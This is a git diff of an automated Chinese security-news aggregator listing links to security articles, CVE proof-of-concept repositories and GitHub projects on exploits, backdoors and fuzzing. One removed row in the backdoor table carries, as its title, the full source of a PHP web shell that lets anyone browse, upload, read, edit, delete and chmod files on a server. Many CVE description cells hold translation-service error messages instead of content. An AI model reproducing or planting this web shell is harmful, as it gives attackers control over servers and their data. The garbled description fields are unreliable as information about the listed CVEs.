@@ -6,6 +6,14 @@
 # 玄武实验室 推荐
 | ts | title | url| 
 | --- | --- | ---| 
+| 20201112 | Memory tagging in LLVM and Android | https://www.youtube.com/watch?v=tqG9pr1K5G8| 
+| 20201112 | 取证分析之 OpenSSH Session 信息解密 | https://research.nccgroup.com/2020/11/11/decrypting-openssh-sessions-for-fun-and-profit/| 
+| 20201112 | UEFI Firmware Coverage-Guided Fuzzing | https://labs.sentinelone.com/moving-from-dynamic-emulation-of-uefi-modules-to-coverage-guided-fuzzing-of-uefi-firmware/| 
+| 20201112 | Microsoft SharePoint Server 信息泄露漏洞分析与 PoC | https://srcincite.io/advisories/src-2020-0024/| 
+| 20201112 | Intel CSME 安全管理引擎技术白皮书 | https://www.intel.com/content/dam/www/public/us/en/security-advisory/documents/intel-csme-security-white-paper.pdf| 
+| 20201112 | Detecting SSH Activity via Process Monitoring | https://themittenmac.com/detecting-ssh-activity-via-process-monitoring/| 
+| 20201112 | [Linux Kernel Exploitation 0x0] Debugging the Kernel with QEMU | https://blog.k3170makan.com/2020/11/linux-kernel-exploitation-0x0-debugging.html| 
+| 20201112 | ZecOps 团队对 ICMPv6 Bad Neighbor 漏洞的分析 | https://blog.zecops.com/vulnerabilities/exploring-the-exploitability-of-bad-neighbor-the-recent-icmpv6-vulnerability-cve-2020-16898/| 
 | 20201111 | Fixing leaky logs: how to find a bug and ensure it never returns | https://r2c.dev/blog/2020/fixing-leaky-logs-how-to-find-a-bug-and-ensure-it-never-returns/| 
 | 20201111 | How to get root on Ubuntu 20.04 by pretending nobody’s /home | https://securitylab.github.com/research/Ubuntu-gdm3-accountsservice-LPE/| 
 | 20201111 | Sleep Attack: Intel Bootguard vulnerability waking from S3 | https://trmm.net/Sleep_attack/| 
@@ -18,59 +26,51 @@
 | 20201111 | kernel exploit for Apple iOS 13.X | https://github.com/0x36/oob_events| 
 | 20201110 | Ubuntu gdm3 CVE-2020-16125 本地提权漏洞分析 | https://securitylab.github.com/advisories/GHSL-2020-202-gdm3-LPE-unresponsive-accounts-daemon/| 
 | 20201110 | V8: Turbofan fails to deoptimize code after map deprecation, leading to type confusion | https://bugs.chromium.org/p/project-zero/issues/detail?id=2106| 
-| 20201110 | The Kubernetes Handbook | https://www.freecodecamp.org/news/the-kubernetes-handbook/| 
-| 20201110 | Booting a macOS Apple Silicon kernel in QEMU | https://worthdoingbadly.com/xnuqemu3/| 
-| 20201110 | TP-Link Takeover with a Flash Drive | https://medium.com/tenable-techblog/tp-link-takeover-with-a-flash-drive-d493666f6b39| 
-| 20201110 | TCL Android 智能电视多个高危漏洞分析 | https://sick.codes/extraordinary-vulnerabilities-discovered-in-tcl-android-tvs-now-worlds-3rd-largest-tv-manufacturer/| 
-| 20201110 | JavaScriptCore Internals - 从 JS 源码到 Bytecode 字节码的编译过程分析 | https://zon8.re/posts/jsc-internals-part1-tracing-js-source-to-bytecode/| 
-| 20201110 | Bitdefender：UPX解压缩二进制文件对内存安全研究。 | https://landave.io/2020/11/bitdefender-upx-unpacking-featuring-ten-memory-corruptions/| 
-| 20201110 | HTTP-revshell: 用于Red team练习和渗透测试者的Powershell脚本工具，通过HTTP/S协议反向链接。 | https://github.com/3v4Si0N/HTTP-revshell| 
-| 20201109 | 编写驱动程序来处理模糊测试的Hyper-V“桥”教程系列 —第2部分：超级调用和MDLs功能介绍。 | https://alex-ionescu.com/?p=471| 
 
 
 # 安全维基 推荐
 | ts | title | url| 
 | --- | --- | ---| 
+| 20201112 | Java安全之CC4链 | https://www.sec-in.com/article/640| 
+| 20201112 | 一名二进制CTF选手的一点心得 | https://www.sec-in.com/article/641| 
+| 20201112 | RapidDNS域名查询如何联动Goby | https://nosec.org/home/detail/4605.html| 
+| 20201112 | 细说php反序列化字符逃逸 | https://mp.weixin.qq.com/s/7jAS7R_GuBBz6M8U6lQv-w| 
 | 20201111 | Metasploit修改hosts多种方法 | https://mp.weixin.qq.com/s/kH7WJqzOSiPGve7oMLJKyQ| 
 | 20201111 | 帮助信息网络犯罪活动罪案例汇总 | https://mp.weixin.qq.com/s/RlFD6H-_4j5g2R49IE9ghw| 
 | 20201110 | 蜜罐调研与内网安全 | https://mp.weixin.qq.com/s/-lJT3PNsj-VvMxalHb06AA| 
 | 20201109 | KaliLinux常见问题与解决方案 | https://mp.weixin.qq.com/s/Nd-GiDnzk5lDg6g7MvRJhg| 
 | 20201109 | SecWiki周刊（第349期) | https://www.sec-wiki.com/weekly/349| 
 | 20201109 | windows横向渗透中的令牌完整性限制 | https://mp.weixin.qq.com/s/idzRDjcQDPdiAd4dnJQs0w| 
-| 20201109 | HMGNN：异构小图神经网络及其在拉新裂变风控场景的应用 | https://mp.weixin.qq.com/s/VRDOQsEdA-QfNRtKQCSjUA| 
-| 20201107 | 基于跨模态检索的二进制代码-源代码匹配 | https://mp.weixin.qq.com/s/fvnvh25VaHgproPvVT6LDg| 
-| 20201107 | 云上渗透-RDS数据库攻防 | https://xz.aliyun.com/t/8451| 
-| 20201107 | 谷歌浏览器插件 - 渗透测试篇 | https://mp.weixin.qq.com/s/G4I3m46w1adLQbES50wCwg| 
 
 
 # CVE Github 推荐
 | ts | cve_id | title | url | cve_detail| 
 | --- | --- | --- | --- | ---| 
-| 20201112T02:37:34Z | CVE-2020-10189 | Null | https://github.com/zavke/CVE-2020-10189-ManageEngine | MYMEMORY WARNING: YOU USED ALL AVAILABLE FREE TRANSLATIONS FOR TODAY. NEXT AVAILABLE IN  21 HOURS 00 MINUTES 43 SECONDSVISIT HTTPS://MYMEMORY.TRANSLATED.NET/DOC/USAGELIMITS.PHP TO TRANSLATE MORE| 
-| 20201112T02:12:01Z | CVE-2020-14882 | Null | https://github.com/QmF0c3UK/CVE-2020-14882 | QUERY LENGTH LIMIT EXCEDEED. MAX ALLOWED QUERY : 500 CHARS| 
+| 20201112T12:24:32Z | CVE-2020-15228 | Fix CVE-2020-15228 (set-env, add-path in Github-Actions) | https://github.com/guettli/fix-CVE-2020-15228 | | 
+| 20201112T12:16:35Z | CVE-2020-2020 | Null | https://github.com/x51/CVE-2020-2020-14882 | 未查询到CVE信息| 
+| 20201112T10:34:58Z | CVE-2020-16126 | A bash script exploit of [CVE-2020-16126/CVE-2020-16127] to achieve privilege escalation. | https://github.com/zev3n/Ubuntu-Gnome-privilege-escalation | MYMEMORY WARNING: YOU USED ALL AVAILABLE FREE TRANSLATIONS FOR TODAY. NEXT AVAILABLE IN  10 HOURS 59 MINUTES 13 SECONDSVISIT HTTPS://MYMEMORY.TRANSLATED.NET/DOC/USAGELIMITS.PHP TO TRANSLATE MORE| 
+| 20201112T10:07:30Z | CVE-2020-14882 | Null | https://github.com/QmF0c3UK/CVE-2020-14882 | QUERY LENGTH LIMIT EXCEDEED. MAX ALLOWED QUERY : 500 CHARS| 
+| 20201112T06:17:04Z | CVE-2020-5902 | A network detection package for CVE-2020-5902, a CVE10.0 vulnerability affecting F5 Networks, Inc BIG-IP devices. | https://github.com/corelight/CVE-2020-5902-F5BigIP | MYMEMORY WARNING: YOU USED ALL AVAILABLE FREE TRANSLATIONS FOR TODAY. NEXT AVAILABLE IN  10 HOURS 58 MINUTES 51 SECONDSVISIT HTTPS://MYMEMORY.TRANSLATED.NET/DOC/USAGELIMITS.PHP TO TRANSLATE MORE| 
+| 20201112T02:37:34Z | CVE-2020-10189 | Null | https://github.com/zavke/CVE-2020-10189-ManageEngine | MYMEMORY WARNING: YOU USED ALL AVAILABLE FREE TRANSLATIONS FOR TODAY. NEXT AVAILABLE IN  10 HOURS 59 MINUTES 12 SECONDSVISIT HTTPS://MYMEMORY.TRANSLATED.NET/DOC/USAGELIMITS.PHP TO TRANSLATE MORE| 
 | 20201112T02:04:13Z | CVE-2020-14882 | Vulmap - Web漏洞扫描和验证工具，可对Web容器、Web服务器、Web中间件以及CMS等Web程序进行漏洞扫描，并且具备漏洞利用功能。 相关测试人员可以使用vulmap检测目标是否存在特定漏洞，并且可以使用漏洞利用功能验证漏洞是否真实存在。CVE-2020-14882, CVE-2020-2555, CVE-2020-2883 | https://github.com/zhzyker/vulmap | | 
-| 20201111T23:02:02Z | CVE-2020-12928 | Early 2019 - late 2020. R.I.P. CVE-2020-12928 https://h0mbre.github.io/RyzenMaster_CVE/# | https://github.com/ekknod/EC_PRO-LAN | MYMEMORY WARNING: YOU USED ALL AVAILABLE FREE TRANSLATIONS FOR TODAY. NEXT AVAILABLE IN  21 HOURS 00 MINUTES 34 SECONDSVISIT HTTPS://MYMEMORY.TRANSLATED.NET/DOC/USAGELIMITS.PHP TO TRANSLATE MORE| 
-| 20201111T21:39:35Z | CVE-2020-9273 | some files created during analysis of ProFTPd vulnerability - no exploit created yet | https://github.com/ptef/CVE-2020-9273 | MYMEMORY WARNING: YOU USED ALL AVAILABLE FREE TRANSLATIONS FOR TODAY. NEXT AVAILABLE IN  21 HOURS 00 MINUTES 30 SECONDSVISIT HTTPS://MYMEMORY.TRANSLATED.NET/DOC/USAGELIMITS.PHP TO TRANSLATE MORE| 
-| 20201111T19:48:40Z | CVE-2020-15931 | Netwrix Account Lockout Examiner 4.1 Domain Admin Account Credential Disclosure Vulnerability | https://github.com/optiv/CVE-2020-15931 | MYMEMORY WARNING: YOU USED ALL AVAILABLE FREE TRANSLATIONS FOR TODAY. NEXT AVAILABLE IN  21 HOURS 00 MINUTES 26 SECONDSVISIT HTTPS://MYMEMORY.TRANSLATED.NET/DOC/USAGELIMITS.PHP TO TRANSLATE MORE| 
-| 20201111T16:02:47Z | CVE-2020-8840 | Jackson-databind远程代码执行漏洞（CVE-2020-8840）分析复现环境代码 | https://github.com/veraxy9821/CVE-2020-8840 | MYMEMORY WARNING: YOU USED ALL AVAILABLE FREE TRANSLATIONS FOR TODAY. NEXT AVAILABLE IN  21 HOURS 00 MINUTES 41 SECONDSVISIT HTTPS://MYMEMORY.TRANSLATED.NET/DOC/USAGELIMITS.PHP TO TRANSLATE MORE| 
-| 20201111T09:28:46Z | CVE-2020-1472 | Check for events that indicate non compatible devices -> CVE-2020-1472 | https://github.com/maikelnight/zerologon | MYMEMORY WARNING: YOU USED ALL AVAILABLE FREE TRANSLATIONS FOR TODAY. NEXT AVAILABLE IN  21 HOURS 00 MINUTES 27 SECONDSVISIT HTTPS://MYMEMORY.TRANSLATED.NET/DOC/USAGELIMITS.PHP TO TRANSLATE MORE| 
-| 20201111T09:18:49Z | CVE-2020-14883 | Weblogic 身份认证绕过漏洞批量检测脚本 | https://github.com/B1anda0/CVE-2020-14883 | QUERY LENGTH LIMIT EXCEDEED. MAX ALLOWED QUERY : 500 CHARS| 
-| 20201111T07:22:06Z | CVE-2020-14882 | 基于qt的图形化CVE-2020-14882漏洞回显测试工具. | https://github.com/AirEvan/CVE-2020-14882-GUI-Test | QUERY LENGTH LIMIT EXCEDEED. MAX ALLOWED QUERY : 500 CHARS| 
+| 20201111T23:02:02Z | CVE-2020-12928 | Early 2019 - late 2020. R.I.P. CVE-2020-12928 https://h0mbre.github.io/RyzenMaster_CVE/# | https://github.com/ekknod/EC_PRO-LAN | MYMEMORY WARNING: YOU USED ALL AVAILABLE FREE TRANSLATIONS FOR TODAY. NEXT AVAILABLE IN  10 HOURS 59 MINUTES 00 SECONDSVISIT HTTPS://MYMEMORY.TRANSLATED.NET/DOC/USAGELIMITS.PHP TO TRANSLATE MORE| 
+| 20201111T21:39:35Z | CVE-2020-9273 | some files created during analysis of ProFTPd vulnerability - no exploit created yet | https://github.com/ptef/CVE-2020-9273 | MYMEMORY WARNING: YOU USED ALL AVAILABLE FREE TRANSLATIONS FOR TODAY. NEXT AVAILABLE IN  10 HOURS 58 MINUTES 55 SECONDSVISIT HTTPS://MYMEMORY.TRANSLATED.NET/DOC/USAGELIMITS.PHP TO TRANSLATE MORE| 
+| 20201111T19:48:40Z | CVE-2020-15931 | Netwrix Account Lockout Examiner 4.1 Domain Admin Account Credential Disclosure Vulnerability | https://github.com/optiv/CVE-2020-15931 | MYMEMORY WARNING: YOU USED ALL AVAILABLE FREE TRANSLATIONS FOR TODAY. NEXT AVAILABLE IN  10 HOURS 58 MINUTES 52 SECONDSVISIT HTTPS://MYMEMORY.TRANSLATED.NET/DOC/USAGELIMITS.PHP TO TRANSLATE MORE| 
 
 
 # klee on Github 推荐
 | ts | title | url | stars | forks| 
 | --- | --- | --- | --- | ---| 
+| 20201112T10:14:02Z | KLEE Symbolic Execution Engine | https://github.com/klee/klee | 1539 | 467| 
+| 20201112T06:01:03Z | Null | https://github.com/klee-chan/klee-chan.github.io | 0 | 0| 
+| 20201112T03:31:29Z | Null | https://github.com/DonaldKLee/DonaldKLee | 0 | 0| 
 | 20201112T02:14:36Z | Still currently in progress | https://github.com/DonaldKLee/DonaldKLee.github.io | 1 | 0| 
 | 20201112T01:28:33Z | Create CFGs and compute complexity metrics for Python, C++, and Java code. | https://github.com/hmc-alpaqa/metrinome | 5 | 0| 
-| 20201111T15:13:35Z | KLEE Symbolic Execution Engine | https://github.com/klee/klee | 1539 | 467| 
 | 20201110T17:21:24Z | Urban Evidence Based Policy (SPPA667) | https://github.com/KLeeDE/PUS2020_KLee | 0 | 1| 
 | 20201110T16:56:58Z | Null | https://github.com/thierry-tct/KLEE-SEMu | 1 | 0| 
 | 20201110T13:44:55Z | Symbiotic is a tool for finding bugs in computer programs based on instrumentation, program slicing and KLEE | https://github.com/staticafi/symbiotic | 200 | 33| 
 | 20201109T17:09:04Z | Null | https://github.com/kyechou/aur-klee-libcxx | 0 | 0| 
 | 20201109T16:25:33Z | Null | https://github.com/kyechou/aur-klee-git | 0 | 0| 
-| 20201109T14:04:38Z | Null | https://github.com/tmin97/klee | 0 | 0| 
-| 20201109T13:50:25Z | Website for the KLEE project: https://klee.github.io/ | https://github.com/klee/klee.github.io | 13 | 43| 
 
 
 # s2e on Github 推荐
@@ -85,46 +85,46 @@
 # exploit on Github 推荐
 | ts | title | url | stars | forks| 
 | --- | --- | --- | --- | ---| 
-| 20201112T02:50:38Z | Curated list of Unix binaries that can be exploited to bypass system security restrictions | https://github.com/GTFOBins/GTFOBins.github.io | 3563 | 497| 
-| 20201112T02:39:59Z | A bunch of scripts for minecraft exploitation (still under development) | https://github.com/ivfreire/mc_scripts | 0 | 0| 
-| 20201112T02:23:21Z | Exploit Database binary exploits located in the /sploits directory | https://github.com/offensive-security/exploitdb-bin-sploits | 1326 | 479| 
-| 20201112T02:14:29Z | binary exploitation, software exploitation etc. | https://github.com/gabemarr26/reverse-engineering-lab-attempts | 0 | 0| 
-| 20201112T01:49:13Z | exploits and proof-of-concept vulnerability demonstration files from the team at Hacker House | https://github.com/hackerhouse-opensource/exploits | 198 | 58| 
-| 20201112T01:19:27Z | Repo containing different POC%s for assorted applications | https://github.com/disastrpc/exploits | 0 | 0| 
-| 20201112T01:11:55Z | Null | https://github.com/SeanLossef/modern-binary-exploitation | 0 | 0| 
-| 20201112T01:02:10Z | Silice is an open source language that simplifies writing algorithms fully exploiting FPGA architectures. | https://github.com/sylefeb/Silice | 357 | 27| 
-| 20201112T00:36:27Z | Writeups/exploit code for CTFs I%ve done | https://github.com/captainGeech42/ctf-writeups | 10 | 2| 
-| 20201111T23:15:37Z | Null | https://github.com/quentin452/Cats-Exploitz-HUB | 0 | 1| 
+| 20201112T12:59:53Z | CTF竞赛权威指南(Pwn篇) | https://github.com/firmianay/CTF-All-In-One | 2132 | 436| 
+| 20201112T12:48:58Z | 🔍NVD exploit & JVN(Japan Vulnerability Notes) easy description | https://github.com/nomi-sec/NVD-Exploit-List-Ja | 6 | 4| 
+| 20201112T11:31:23Z | blog repository (nonetype.kr) | https://github.com/nonetype/nonetype.github.io | 0 | 0| 
+| 20201112T11:16:17Z | WptsExtensions.dll for exploiting DLL hijacking of the task scheduler. | https://github.com/phackt/wptsextensions.dll | 1 | 1| 
+| 20201112T11:05:42Z | A bunch of scripts for minecraft exploitation (still under development) | https://github.com/ivfreire/mc_scripts | 0 | 0| 
+| 20201112T10:47:38Z | xcube is a Python package for generating and exploiting data cubes powered by xarray, dask, and zarr. | https://github.com/dcs4cop/xcube | 65 | 11| 
+| 20201112T10:34:58Z | A bash script exploit of [CVE-2020-16126/CVE-2020-16127] to achieve privilege escalation. | https://github.com/zev3n/Ubuntu-Gnome-privilege-escalation | 0 | 0| 
+| 20201112T10:28:17Z | Sifter is a OSINT, recon & vulnerability scanner. It incorporates a plethara of tools within different module sets that tries to cover every attack vector. Allowing you to quickly perform recon tasks and organize the results in one place. From OSINT to Recon, Exploitation, Post-Exploitation, OpSec, Threat Analysis, XSS, SQLinjection, Network Scanning, WebApp Analysis or DNS enumeration.. Sifter should be able to cover it all. | https://github.com/s1l3nt78/sifter | 280 | 88| 
+| 20201112T10:25:45Z | Search and download dictionaries for testing, bruteforcing, fuzzing and exploit-development. | https://github.com/pownjs/dicts | 9 | 0| 
+| 20201112T10:04:32Z | TPs de BASH du S4 - UE Système Exploitation FST UJM | https://github.com/Kevin-Grgd/TP_bash | 0 | 0| 
 
 
 # backdoor on Github 推荐
 | ts | title | url | stars | forks| 
 | --- | --- | --- | --- | ---| 
+| 20201112T10:09:48Z | LKM rootkit for Linux Kernels 2.6.x/3.x/4.x/5.x (x86/x86_64 and ARM64) | https://github.com/m0nad/Diamorphine | 654 | 252| 
+| 20201112T09:01:39Z | Basic Windows reverse shell written in C++ | https://github.com/hacefresko/CppBackdoor | 0 | 0| 
+| 20201112T07:56:32Z | Null | https://github.com/penetrators-sec/RANSBOT | 0 | 0| 
+| 20201112T07:30:12Z | FOR HW | https://github.com/sackie96/NEW-BACKDOOR | 0 | 0| 
+| 20201112T07:11:52Z | Null | https://github.com/weizn11/Cisco_ASA_Backdoor | 0 | 0| 
+| 20201112T06:42:19Z | Null | https://github.com/FalseG0d/PythonBackdoor | 0 | 0| 
 | 20201111T21:32:43Z | IIS-Trojan is a native IIS module written in c++ that creates a backdoor in the IIS webserver and carry out custom actions defined by an attacker. | https://github.com/tborg2793/IIS-TROJAN | 0 | 0| 
 | 20201111T21:27:53Z | Backdoors framework based on %Blind Backdoors in Deep Learning Models% | https://github.com/ebagdasa/backdoors101 | 2 | 0| 
 | 20201111T18:12:22Z | Prueba de Backdoor en Python. Con Screenshot, subida, bajada y navegación. | https://github.com/cmoralesmani/backdoor_in_python | 0 | 0| 
 | 20201111T17:49:22Z | Null | https://github.com/Retr0-code/Phoenix | 0 | 0| 
-| 20201111T16:28:46Z | Making a python backdoor from scratch with some assistance from johan godinho%s tutorials on youtube | https://github.com/lesterj390/python-backdoor | 0 | 0| 
-| 20201111T14:01:12Z | An Artificial Intelligence Poisoned Data Detection & Cleanse System | https://github.com/RidiculousDoge/AIPDC | 2 | 2| 
-| 20201111T13:15:14Z | ParadoxiaRat : Native Windows Remote access Tool. | https://github.com/quantumcored/paradoxiaRAT | 247 | 52| 
-| 20201111T12:16:52Z | <?php set_time_limit(0); error_reporting(0);  if(get_magic_quotes_gpc()){ foreach($_POST as $key=>$value){ $_POST[$key] = stripslashes($value);  } } echo %<!DOCTYPE HTML> <HTML> <HEAD> <link href=%% rel=%stylesheet% type=%text/css%> <title>G1F412 shell backdoor</title><link rel=%SHORTCUT ICON%  href=%http://www.hi5style.com/gr/heart.gif%> <style> body{ font-family: %Courier%, cursive; color: #fff; background-color: #000; background-image:url(%https://f.top4top.io/p_17717wd2v0.gif%);align-content: fixed;background-size:130%; } text-shadow:0px 0px 1px #757575; } #content tr:hover{ background-color: #000; text-shadow:0px 0px 10px #fff; } #content .first{ background-color: dark turquoise; } #content .first:hover{ background-color: dark turquoise; text-shadow:0px 0px 1px #757575; } H1{ font-family: %Courier%, cursive; color: #fff; } a{ color: #fff; text-decoration: none; } a:hover{ color: #fff; text-shadow:0px 0px 5px #ffffff; } input,select,textarea{ border: 1px #fff solid; -moz-border-radius: 5px; -webkit-border-radius:5px; border-radius:5px; } </style> </HEAD> <BODY> <br> <center></center> <h1><center><a href=%https://instagram.com/midnight_coders_team?igshid=1bv58zw6nsgjs%>Midnight Coders Team</a></center></h1> <table width=%700% border=%0% cellpadding=%3% cellspacing=%1% align=%center%> <tr><td>Current Path : %; if(isset($_GET[%path%])){ $path = $_GET[%path%]; }else{ $path = getcwd(); } $path = str_replace(%\\%,%/%,$path); $paths = explode(%/%,$path);  foreach($paths as $id=>$pat){ if($pat == %% && $id == 0){ $a = true; echo %<a href=%?path=/%>/</a>%; continue; } if($pat == %%) continue; echo %<a href=%?path=%; for($i=0;$i<=$id;$i++){ echo %$paths[$i]%; if($i != $id) echo %/%; } echo %%>%.$pat.%</a>/%; } echo %</td></tr><tr><td>%; if(isset($_FILES[%file%])){ if(copy($_FILES[%file%][%tmp_name%],$path.%/%.$_FILES[%file%][%name%])){ echo %<font color=%green%>Upload File Success!</font><br />%; }else{ echo %<font color=%red%>Failed for Upload File!</font><br />%; } } echo %<form enctype=%multipart/form-data% method=%POST%> Upload File : <input type=%file% name=%file% /> <input type=%submit% value=%upload% /> </form> </td></tr>%; if(isset($_GET[%filesrc%])){ echo %<tr><td>Current File : %; echo $_GET[%filesrc%]; echo %</tr></td></table><br />%; echo(%<pre>%.htmlspecialchars(file_get_contents($_GET[%filesrc%])).%</pre>%); }elseif(isset($_GET[%option%]) && $_POST[%opt%] != %delete%){ echo %</table><br /><center>%.$_POST[%path%].%<br /><br />%; if($_POST[%opt%] == %chmod%){ if(isset($_POST[%perm%])){ if(chmod($_POST[%path%],$_POST[%perm%])){ echo %<font color=%green%>Change Permission Success~!</font><br />%; }else{ echo %<font color=%red%>Failed for Change Permission !</font><br />%; } } echo %<form method=%POST%> Permission : <input name=%perm% type=%text% size=%4% value=%%.substr(sprintf(%%o%, fileperms($_POST[%path%])), -4).%% /> <input type=%hidden% name=%path% value=%%.$_POST[%path%].%%> <input type=%hidden% name=%opt% value=%chmod%> <input type=%submit% value=%Go% /> </form>%; }elseif($_POST[%opt%] == %rename%){ if(isset($_POST[%newname%])){ if(rename($_POST[%path%],$path.%/%.$_POST[%newname%])){ echo %<font color=%green%>Change Name Success!</font><br />%; }else{ echo %<font color=%red%>Failed for Change Name !</font><br />%; } $_POST[%name%] = $_POST[%newname%]; } echo %<form method=%POST%> New Name : <input name=%newname% type=%text% size=%20% value=%%.$_POST[%name%].%% /> <input type=%hidden% name=%path% value=%%.$_POST[%path%].%%> <input type=%hidden% name=%opt% value=%rename%> <input type=%submit% value=%Go% /> </form>%; }elseif($_POST[%opt%] == %edit%){ if(isset($_POST[%src%])){ $fp = fopen($_POST[%path%],%w%); if(fwrite($fp,$_POST[%src%])){ echo %<font color=%green%>Edit File Success!</font><br />%; }else{ echo %<font color=%red%>Failed for Edit File!</font><br />%; } fclose($fp); } echo %<form method=%POST%> <textarea cols=80 rows=20 name=%src%>%.htmlspecialchars(file_get_contents($_POST[%path%])).%</textarea><br /> <input type=%hidden% name=%path% value=%%.$_POST[%path%].%%> <input type=%hidden% name=%opt% value=%edit%> <input type=%submit% value=%Go% /> </form>%; } echo %</center>%; }else{ echo %</table><br /><center>%; if(isset($_GET[%option%]) && $_POST[%opt%] == %delete%){ if($_POST[%type%] == %dir%){ if(rmdir($_POST[%path%])){ echo %<font color=%green%>Delete Dir Success!</font><br />%; }else{ echo %<font color=%red%>Failed for Delete Dir!</font><br />%; } }elseif($_POST[%type%] == %file%){ if(unlink($_POST[%path%])){ echo %<font color=%green%>Delete File Success!</font><br />%; }else{ echo %<font color=%red%>Failed for Edit File!</font><br />%; } } } echo %</center>%; $scandir = scandir($path); echo %<div id=%content%><table width=%700% border=%0% cellpadding=%3% cellspacing=%1% align=%center%> <tr class=%first%> <td><center>Name</center></td> <td><center>Size</center></td> <td><center>Permissions</center></td> <td><center>Options</center></td> </tr>%;  foreach($scandir as $dir){ if(!is_dir(%$path/$dir%) ,, $dir == %.% ,, $dir == %..%) continue; echo %<tr> <td><a href=\%?path=$path/$dir\%>$dir</a></td> <td><center>--</center></td> <td><center>%; if(is_writable(%$path/$dir%)) echo %<font color=%green%>%; elseif(!is_readable(%$path/$dir%)) echo %<font color=%red%>%; echo perms(%$path/$dir%); if(is_writable(%$path/$dir%) ,, !is_readable(%$path/$dir%)) echo %</font>%;  echo %</center></td> <td><center><form method=\%POST\% action=\%?option&path=$path\%> <select name=\%opt\%> <option value=\%\%></option> <option value=\%delete\%>Delete</option> <option value=\%chmod\%>Chmod</option> <option value=\%rename\%>Rename</option> </select> <input type=\%hidden\% name=\%type\% value=\%dir\%> <input type=\%hidden\% name=\%name\% value=\%$dir\%> <input type=\%hidden\% name=\%path\% value=\%$path/$dir\%> <input type=\%submit\% value=\%>\% /> </form></center></td> </tr>%; } echo %<tr class=%first%><td></td><td></td><td></td><td></td></tr>%; foreach($scandir as $file){ if(!is_file(%$path/$file%)) continue; $size = filesize(%$path/$file%)/1024; $size = round($size,3); if($size >= 1024){ $size = round($size/1024,2).% MB%; }else{ $size = $size.% KB%; }  echo %<tr> <td><a href=\%?filesrc=$path/$file&path=$path\%>$file</a></td> <td><center>%.$size.%</center></td> <td><center>%; if(is_writable(%$path/$file%)) echo %<font color=%green%>%; elseif(!is_readable(%$path/$file%)) echo %<font color=%red%>%; echo perms(%$path/$file%); if(is_writable(%$path/$file%) ,, !is_readable(%$path/$file%)) echo %</font>%; echo %</center></td> <td><center><form method=\%POST\% action=\%?option&path=$path\%> <select name=\%opt\%> <option value=\%\%></option> <option value=\%delete\%>Delete</option> <option value=\%chmod\%>Chmod</option> <option value=\%rename\%>Rename</option> <option value=\%edit\%>Edit</option> </select> <input type=\%hidden\% name=\%type\% value=\%file\%> <input type=\%hidden\% name=\%name\% value=\%$file\%> <input type=\%hidden\% name=\%path\% value=\%$path/$file\%> <input type=\%submit\% value=\%>\% /> </form></center></td> </tr>%; } echo %</table> </div>%; } echo %<br /><font color=%red%></font><font color=%red%>shell backdoor</font> <center>@Copyright 2020 , IG: <a href=%https://instagram.com/midnight_coders_team?igshid=1bv58zw6nsgjs%>Midnight Coders Team</a></center> <center>AUTHOR: <a href=%https://instagram.com/gifarirahman_exp?igshid=zrxa2b35pzxp%>G1F412</a></center> </BODY> </HTML>%; function perms($file){ $perms = fileperms($file);  if (($perms & 0xC000) == 0xC000) { // Socket $info = %s%; } elseif (($perms & 0xA000) == 0xA000) { // Symbolic Link $info = %l%; } elseif (($perms & 0x8000) == 0x8000) { // Regular $info = %-%; } elseif (($perms & 0x6000) == 0x6000) { // Block special $info = %b%; } elseif (($perms & 0x4000) == 0x4000) { // Directory $info = %d%; } elseif (($perms & 0x2000) == 0x2000) { // Character special $info = %c%; } elseif (($perms & 0x1000) == 0x1000) { // FIFO pipe $info = %p%; } else { // Unknown $info = %u%; }  // Owner $info .= (($perms & 0x0100) ? %r% : %-%); $info .= (($perms & 0x0080) ? %w% : %-%); $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? %s% : %x% ) : (($perms & 0x0800) ? %S% : %-%));  // Group $info .= (($perms & 0x0020) ? %r% : %-%); $info .= (($perms & 0x0010) ? %w% : %-%); $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? %s% : %x% ) : (($perms & 0x0400) ? %S% : %-%));  // World $info .= (($perms & 0x0004) ? %r% : %-%); $info .= (($perms & 0x0002) ? %w% : %-%); $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? %t% : %x% ) : (($perms & 0x0200) ? %T% : %-%));  return $info; } ?> | https://github.com/MIDNIGHT-CODERS-TEAM/file-MCT.php | 0 | 0| 
-| 20201111T11:52:50Z | Unicorn Framework is an iOS, macOS and Linux post-exploitation framework that using one line command and powerful python payload attempts to spawn a command line session with a lot of features such as downloading files, uploading files, getting system information and etc. | https://github.com/EntySec/unicorn | 8 | 3| 
-| 20201111T11:21:11Z | FUD cross-platform python2 backdoor | https://github.com/7h3w4lk3r/pyback | 9 | 4| 
 
 
 # fuzz on Github 推荐
 | ts | title | url | stars | forks| 
 | --- | --- | --- | --- | ---| 
-| 20201112T02:40:36Z | A self-hosted Fuzzing-As-A-Service platform | https://github.com/microsoft/onefuzz | 2197 | 106| 
-| 20201112T02:30:41Z | Null | https://github.com/googleinterns/hw-fuzzing | 2 | 0| 
-| 20201112T02:19:28Z | Null | https://github.com/Seal125/fuzzy-happiness | 0 | 0| 
-| 20201112T02:03:25Z | Fuzzy matching for Neovim | https://github.com/amirrezaask/fuzzy.nvim | 22 | 1| 
-| 20201112T01:01:01Z | Null | https://github.com/kmolano/HelpFuzzyChat | 0 | 0| 
-| 20201112T00:15:25Z | Fuzzy matching publications for fatcat (wip). | https://github.com/miku/fuzzycat | 0 | 1| 
-| 20201111T23:24:47Z | OSS-Fuzz - continuous fuzzing of open source software. | https://github.com/google/oss-fuzz | 5644 | 1112| 
-| 20201111T21:52:17Z | Experimental projects | https://github.com/tannmatter/fuzzy-happiness | 0 | 0| 
-| 20201111T21:20:07Z | Repo for fuzzing basic repository with travis CI | https://github.com/Pascal-0x90/Travis-Fuzz-Basic | 0 | 0| 
-| 20201111T20:58:54Z | Web Security Dictionary | https://github.com/3had0w/Fuzzing-Dicts | 146 | 66| 
+| 20201112T12:59:56Z | One Knob Fuzz Custom Noise | https://github.com/bjc01/1KFCN | 0 | 0| 
+| 20201112T12:57:42Z | Collection of HTTP scanners and fuzzers. | https://github.com/buffermet/bug-bounty-tools | 8 | 1| 
+| 20201112T12:45:30Z | Null | https://github.com/jackhydez/fuzzyNumbers | 0 | 0| 
+| 20201112T12:43:25Z | Null | https://github.com/s9varesc/url-fuzzing | 0 | 0| 
